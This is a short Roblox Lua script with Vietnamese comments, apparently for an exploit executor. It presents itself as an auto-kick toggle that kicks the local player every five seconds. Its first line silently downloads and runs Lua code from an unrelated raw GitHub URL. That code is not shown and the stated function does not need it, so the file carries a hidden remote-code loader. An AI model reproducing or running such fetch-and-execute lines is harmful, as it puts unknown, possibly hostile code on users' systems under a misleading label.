
loadstring(game:HttpGet("https://raw.githubusercontent.com/dsadgeee/21521521/refs/heads/main/AYA.lua"))()

local Players = game:GetService("Players")

-- Bật/tắt auto kick
local autoKick = true -- true = bật, false = tắt

-- Hàm auto kick
local function doKick()
    Players.LocalPlayer:Kick("Bạn đã bị kick (autoKick = true)")
end

-- Vòng lặp tự động
task.spawn(function()
    while task.wait(5) do -- lặp lại sau mỗi 5 giây
        if autoKick then
            doKick()
        else
            warn("AutoKick đang TẮT (autoKick = false)")
        end
    end
end)
